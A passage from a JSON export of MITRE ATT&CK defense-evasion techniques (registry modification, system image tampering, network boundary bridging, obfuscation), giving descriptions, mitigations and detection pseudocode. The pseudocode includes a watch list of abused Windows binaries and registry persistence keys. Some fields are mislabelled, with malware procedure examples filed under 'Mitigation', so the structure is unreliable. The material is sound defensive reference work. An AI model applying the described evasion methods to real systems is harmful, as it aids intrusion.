        "detects": "Monitor for API calls associated with concealing Registry keys, such as Reghide. [2] Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns [4] and RegDelNull [187]. Other API calls relevant to Registry Modification include RegOpenKeyExA, RegCreateKeyExA, RegDeleteKeyExA, RegDeleteValueExA, RegEnumKeyExA, RegEnumValueExA, among others.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor processes and command-line arguments for actions that could be taken to change, conceal, and/or delete information in the Registry. (i.e. reg.exe, regedit.exe). The analytic is oriented around detecting invocations of Reg where the parent executable is an instance of cmd.exe that wasn’t spawned by explorer.exe. The built-in utility reg.exe provides a command-line interface to the registry, so that queries and modifications can be performed from a shell, such as cmd.exe. When a user is responsible for these actions, the parent of cmd.exewill typically be explorer.exe. Occasionally, power users and administrators write scripts that do this behavior as well, but likely from a different process tree. These background scripts must be baselined so they can be tuned out accordingly. Analytic Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created).  Analytic 1 - Suspicious Processes reg_processes = filter processes where (   (event_id == \"1\" OR event_id == \"4688\") AND (exe == \"reg.exe\" AND parent_exe == \"cmd.exe\"))cmd_processes = filter processes where (   (event_id == \"1\" OR event_id == \"4688\") AND (exe == \"cmd.exe\" AND parent_exe != \"explorer.exe\"\"))reg_and_cmd_processes = join (reg_processes, cmd_processes) where (reg.parent_pid == cmd.pid and reg.hostname == cmd.hostname)Analytic 2 - Rare LolBAS Command Lines lolbas_processes = filter processes where (exe = \"At.exe\" OR exe = \"Atbroker.exe\" OR exe = \"Bash.exe\" OR exe = \"Bitsadmin.exe\" OR exe = \"Certutil.exe\" OR exe = \"Cmd.exe\" OR exe = \"Cmdkey.exe\" OR exe = \"Cmstp.exe\" OR exe = \"Control.exe\" OR exe = \"Csc.exe\" OR exe = \"Cscript.exe\" OR exe = \"Dfsvc.exe\" OR exe = \"Diskshadow.exe\" OR exe = \"Dnscmd.exe\" OR exe = \"Esentutl.exe\" OR exe = \"Eventvwr.exe\" OR exe = \"Expand.exe\" OR exe = \"Extexport.exe\" OR exe = \"Extrac32.exe\" OR exe = \"Findstr.exe\" OR exe = \"Forfiles.exe\" OR exe = \"Ftp.exe\" OR exe = \"Gpscript.exe\" OR exe = \"Hh.exe\" OR exe = \"Ie4uinit.exe\" OR exe = \"Ieexec.exe\" OR exe = \"Infdefaultinstall.exe\" OR exe = \"Installutil.exe\" OR exe = \"Jsc.exe\" OR exe = \"Makecab.exe\" OR exe = \"Mavinject.exe\" OR exe = \"Microsoft.Workflow.r.exe\" OR exe = \"Mmc.exe\" OR exe = \"Msbuild.exe\" OR exe = \"Msconfig.exe\" OR exe = \"Msdt.exe\" OR exe = \"Mshta.exe\" OR exe = \"Msiexec.exe\" OR exe = \"Odbcconf.exe\" OR exe = \"Pcalua.exe\" OR exe = \"Pcwrun.exe\" OR exe = \"Presentationhost.exe\" ORexe = \"Print.exe\" OR exe = \"Reg.exe\" OR exe = \"Regasm.exe\" OR exe = \"Regedit.exe\" OR exe = \"Register-cimprovider.exe\" OR exe = \"Regsvcs.exe\" OR exe = \"Regsvr32.exe\" OR exe = \"Replace.exe\" OR exe = \"Rpcping.exe\" OR exe = \"Rundll32.exe\" OR exe = \"Runonce.exe\" OR exe = \"Runscripthelper.exe\" OR exe = \"Sc.exe\" OR exe = \"Schtasks.exe\" OR exe = \"Scriptrunner.exe\" OR exe = \"SyncAppvPublishingServer.exe\" OR exe = \"Tttracer.exe\" OR exe = \"Verclsid.exe\" OR exe = \"Wab.exe\" OR exe = \"Wmic.exe\" OR exe = \"Wscript.exe\" OR exe = \"Wsreset.exe\" OR exe = \"Xwizard.exe\" OR exe = \"Advpack.dll OR exe = \"Comsvcs.dll OR exe = \"Ieadvpack.dll OR exe = \"Ieaframe.dll OR exe = \"Mshtml.dll OR exe = \"Pcwutl.dll OR exe = \"Setupapi.dll OR exe = \"Shdocvw.dll OR exe = \"Shell32.dll OR exe = \"Syssetup.dll ORexe = \"Url.dll OR exe = \"Zipfldr.dll OR exe = \"Appvlp.exe\" OR exe = \"Bginfo.exe\" OR exe = \"Cdb.exe\" OR exe = \"csi.exe\" OR exe = \"Devtoolslauncher.exe\" OR exe = \"dnx.exe\" OR exe = \"Dxcap.exe\" OR exe = \"Excel.exe\" OR exe = \"Mftrace.exe\" OR exe = \"Msdeploy.exe\" OR exe = \"msxsl.exe\" OR exe = \"Powerpnt.exe\" OR exe = \"rcsi.exe\" OR exe = \"Sqler.exe\" OR exe = \"Sqlps.exe\" OR exe = \"SQLToolsPS.exe\" OR exe = \"Squirrel.exe\" OR exe = \"te.exe\" OR exe = \"Tracker.exe\" OR exe = \"Update.exe\" OR exe = \"vsjitdebugger.exe\" OR exe = \"Winword.exe\" OR exe = \"Wsl.exe\" OR exe = \"CL_Mutexverifiers.ps1 OR exe = \"CL_Invocation.ps1 OR exe = \"Manage-bde.wsf OR exe = \"Pubprn.vbs OR exe = \"Slmgr.vbs OR exe = \"Syncappvpublishingserver.vbs OR exe = \"winrm.vbs OR exe = \"Pester.bat)process_count = count(lolbas_processes) by processprocess_count_avg = average(process_count)process_count_stdev = standard_deviation(process_count)lower_bound = process_count_avg - stdev * 1.5outliers = filter lolbas_processes where (process_count < lower_bound)"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for newly constructed registry keys or values to aid in persistence and execution. Detection of creation of registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode. The key SafeDllSearchMode, if set to 0, will block the Windows mechanism for the search DLL order and adversaries may execute their own malicious dll.Analytic 1 - Registry Edit with Creation of SafeDllSearchMode Key Set to 0safe_dll_search_processes = filter processes where command_line CONTAINS(\"SafeDllSearchMode\") AND ((command_line CONTAINS(\"reg\") AND command_line CONTAINS(\"add\") AND command_line CONTAINS(\"/d\")) OR (command_line CONTAINS(\"Set-ItemProperty\") AND command_line CONTAINS(-value)) OR ((command_line CONTAINS(\"00000000\") AND command_line CONTAINS(0)))reg_keys = search Registry:value_editsafe_dll_reg_keys = filter reg_keys where value=\"SafeDllSearchMode\" AND value_data=\"0\""
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Deletion",
        "detects": "Monitor for unexpected deletion of windows registry keys to hide configuration information, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys or values. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). [188] Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.Detection of modification of the registry key values of Notify, Userinit, and Shell located in HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKEY_LOCAL_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. When a user logs on, the Registry key values of Notify, Userinit and Shell are used to load dedicated Windows component. Attackers may insert malicious payload following the legitimate value to launch a malicious payload.Detection of the modification of the registry key Common Startup located in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\ and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders. When a user logs on, any files located in the Startup Folder are launched. Attackers may modify these folders with other files in order to evade detection set on these default folders. This detection focuses on EventIDs 4688 and 1 for process creation and EventID 4657 for the modification of the Registry Keys.Analytic 1 - Registry Edit with Modification of Userinit, Shell or Notifylogon_reg_processes = filter processes where command_line CONTAINS(\"\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\") AND (command_line CONTAINS(\"Userinit\") OR command_line CONTAINS(\"Shell\") OR command_line CONTAINS(\"Notify\")) AND (((command_line CONTAINS(\"reg\") OR command_line CONTAINS(\"add\") OR command_line CONTAINS(\"/d\")) OR (command_line CONTAINS(\"Set-ItemProperty\") OR command_line CONTAINS(\"New-ItemProperty\") OR command_line CONTAINS(\"-value\"))))reg_keys = search Registry:value_editlogon_reg_keys = filter reg_keys where (value=\"Userinit\" OR value=\"Shell\" OR value=\"Notify\")Analytic 2 - Modification of Default Startup Folder in the Registry Key ‘Common Startup’logon_reg_processes = filter processes where (command_line CONTAINS(\"reg\") AND command_line CONTAINS(\"add\") AND command_line CONTAINS(\"/d\") OR (command_line CONTAINS(\"Set-ItemProperty\") AND command_line CONTAINS(\"-value\")) AND command_line CONTAINS(\"Common Startup\"))reg_keys = search Registry:value_editlogon_reg_keys = filter reg_keys where value=\"Common Startup\""
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Modify System Image",
    "Code": "T1601",
    "Description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
    "Mitigation": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. [1]"
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. [2]"
      },
      {
        "id": "M1043",
        "name": "Credential Access Protection",
        "description": "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. [3]"
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.[4]"
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": "Refer to NIST guidelines when creating password policies. [5]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Most embedded network devices provide a command to print the version of the currently running operating system. Use this command to query the operating system for its version number and compare it to what is expected for the device in question. Because this method may be used in conjunction with  Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file.Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source. Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not. Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised. [6]Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory. If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  [7]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1601.001",
        "name": "Patch System Image"
      },
      {
        "id": "T1601.002",
        "name": "Downgrade System Image"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Network Boundary Bridging",
    "Code": "T1599",
    "Description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.[1]  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
    "Mitigation": [
      {
        "id": "M1043",
        "name": "Credential Access Protection",
        "description": "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations.[2]"
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": "Upon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective."
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.[3]"
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": "Refer to NIST guidelines when creating password policies. [4]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1599.001",
        "name": "Network Address Translation Traversal"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Obfuscated Files or Information",
    "Code": "T1027",
    "Description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [1] Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. [2] Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. [3]Adversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. [4] [5][6]",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.[7]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT's commands, strings, and domains can be Base64 encoded within the payload.[8]"
      },
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.[9][10]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult.[11] Agent Tesla has used the Rijndael symmetric encryption algorithm to encrypt strings.[12]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has obfuscated strings such as antivirus vendor names, domains, files, and others.[13]"
      },
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor has obfuscated code with stack strings and string encryption.[14]"
      },
      {
        "id": "S0584",
        "name": "AppleJeus",
        "description": "AppleJeus has XOR-encrypted collected system information prior to sending to a C2. AppleJeus has also used the open source ADVObfuscation library for its components.[15]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls.[16]"
      },
      {
        "id": "G0099",
        "name": "APT-C-36",
        "description": "APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.[17]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 obfuscates strings in the payload.[18]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 used Base64 to obfuscate payloads.[19]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.[10][20][21][22][23]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 obfuscates files or information to help evade defensive measures.[24]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called \"Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.[25][26][27][28][29][30][31]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used base64 to encode payloads.[32]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 obfuscates strings and payloads.[33][34][35]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used malware to drop encrypted CAB files.[36]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used VMProtected binaries in multiple intrusions.[37]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has used an encrypted configuration file for its loader.[38]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth has used an XOR-based algorithm to encrypt payloads twice with different keys.[39]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.[40]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred encrypts the configuration.[41]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has used encrypted strings.[42]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to XOR encrypt files to be sent to C2.[43]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has used XOR-encoded strings.[44]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect.[45]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can be compressed with the ApLib algorithm.[46]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar has used XOR, RSA2, and RC4 encrypted files.[47][48][49]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear has encrypted payloads using RC4 and XOR.[50]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.[51][52]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.[53]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has used a RAR SFX dropper to deliver malware.[54]"
      },
      {
        "id": "G0063",
        "name": "BlackOasis",
        "description": "BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.[55]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has obfuscated code using Base64 encoding.[56]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has obfuscated the wallet address in the payload binary.[57]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT has a XOR-encoded payload.[58]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can encrypt data using AES prior to exfiltration.[59]"
      },
      {
        "id": "S0415",
        "name": "BOOSTWRITE",
        "description": "BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.[60]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon used the \"StackStrings\" obfuscation technique to hide malicious functionalities.[61]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has used encrypted payload files and maintains an encrypted configuration structure in memory.[62][63]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.[64][65][66]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore has obfuscated data with base64, AES, RC4, and bz2.[67]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used Base64-encoded strings.[68]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.[69]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak encrypts strings to make analysis more difficult.[70]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has used XOR-based encryption to mask C2 server locations within the trojan.[71]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.[72][73]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded.[74]"
      },
      {
        "id": "S0465",
        "name": "CARROTBALL",
        "description": "CARROTBALL has used a custom base64 alphabet to decode files.[75]"
      },
      {
        "id": "S0462",
        "name": "CARROTBAT",
        "description": "CARROTBAT has the ability to download a base64 encoded payload.[76]"
      },
      {
        "id": "S1041",
        "name": "Chinoxy",
        "description": "Chinoxy has encrypted its configuration file.[77]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can encrypt sections of its code to evade detection.[78]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "The Clambling executable has been obfuscated when dropped on a compromised host.[79]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.[80][81]"
      },
      {
        "id": "S0369",
        "name": "CoinTicker",
        "description": "CoinTicker initially downloads a hidden encoded file.[82]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie uses RC4 and Base64 to obfuscate strings.[83]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT has encrypted its virtual file system using AES-256 in XTS mode.[84][85]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker has obfuscated its code to prevent its removal from host machines.[86]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.[87][88][49]"
      },
      {
        "id": "S0137",
        "name": "CORESHELL",
        "description": "CORESHELL obfuscates strings using a custom stream cipher.[89]"
      },
      {
        "id": "S0046",
        "name": "CozyCar",
        "description": "The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.[90]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload.[91]"
      },
      {
        "id": "S0497",
        "name": "Dacls",
        "description": "Dacls can encrypt its configuration file with AES CBC.[92]"
      },
      {
        "id": "S1014",
        "name": "DanBot",
        "description": "DanBot can Base64 encode its payload.[93]"
      },
      {
        "id": "G0070",
        "name": "Dark Caracal",
        "description": "Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.[94]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has obfuscated code using RC4, XOR, and RSA.[95][96]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.[97]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman has been delivered as compressed RAR payloads in ZIP files to victims.[98]"
      },
      {
        "id": "S0187",
        "name": "Daserf",
        "description": "Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.[99]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv's configuration is encrypted.[100]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE has encrypted its payload.[69]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis obfuscates its code and encrypts the API names.[29]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has Base64 encoded the RSA public key used for encrypting files.[101]"
      },
      {
        "id": "S0213",
        "name": "DOGCALL",
        "description": "DOGCALL is encrypted using single-byte XOR.[102]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.[103]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can be partly encrypted with XOR.[104]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex's strings are obfuscated using RC4.[105]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub has used XOR encrypted payloads in WebSocket client to server messages.[106]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware.[107]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used Base64 to encode strings.[108]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury has obfuscated its strings with a simple XOR encryption with a static key.[109]"
      },
      {
        "id": "S0593",
        "name": "ECCENTRICBANDWAGON",
        "description": "ECCENTRICBANDWAGON has encrypted strings with RC4.[110]"
      },
      {
        "id": "S0624",
        "name": "Ecipekac",
        "description": "Ecipekac can use XOR, AES, and DES to encrypt loader shellcode.[111]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS uses encoded strings in its process kill list.[112]"
      },
      {
        "id": "G0066",
        "name": "Elderwood",
        "description": "Elderwood has encrypted documents and malicious executables.[113]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise encrypts several of its files, including configuration files.[114]"
      },
      {
        "id": "G1003",
        "name": "Ember Bear",
        "description": "Ember Bear has obfuscated malware to help avoid detection.[115]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.[116][117]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can Base64 encode payloads.[59]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic heavily obfuscates its code to make analysis more difficult.[118]"
      },
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux uses RC4 for encrypting the configuration.[119][120]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation.[121]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.[122][123]"
      },
      {
        "id": "S0355",
        "name": "Final1stspy",
        "description": "Final1stspy obfuscates strings with base64 encoding.[102]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.[124][125]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "The FIVEHANDS payload is encrypted with AES-128.[126][127][128]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been delivered within ZIP or RAR password-protected archived files.[129]"
      },
      {
        "id": "S0383",
        "name": "FlawedGrace",
        "description": "FlawedGrace encrypts its C2 configuration files with AES in CBC mode.[130]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb has been XOR-encoded.[131]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has base64 encoded payloads to avoid detection.[132]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
